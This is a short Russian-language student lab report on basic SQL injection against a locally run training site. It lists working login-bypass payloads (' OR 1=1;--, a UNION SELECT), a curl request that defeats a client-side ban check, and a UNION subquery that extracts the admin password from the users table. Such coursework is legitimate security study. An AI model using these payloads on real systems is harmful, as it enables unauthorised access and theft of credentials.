# Лабораторная работа 3. Примитивные SQL инъекции.

## Задание 1
Запустим сайт из VSCode. Обойдем защиту двумя способами:

### С помощью кодирования кавычек:
	' OR 1=1;--

### Войдя под произвольным логином:
	' OR 1=1
	  UNION
	  SELECT 'xexe'
	  ORDER BY 1 DESC; --

## Задание 2
Обойдем клиентскую защиту с помощью ``curl``:

	curl 'http://localhost:8080/signin'
	--data-raw 'name=Daria&pass=qazwsx&banned=true'

## Задание 3
Обойдем защиту с помощью кодирования кавычки в альтернативный формат:

	' OR 1=1;--

## Задание 4
Обойдем защиту с помощью кодирования кавычки в альтернативный формат и получим пароль из БД:

	' UNION
	  SELECT null, (SELECT name || '--' || pass FROM users WHERE name = %27admin%27--), NULL FROM dual --
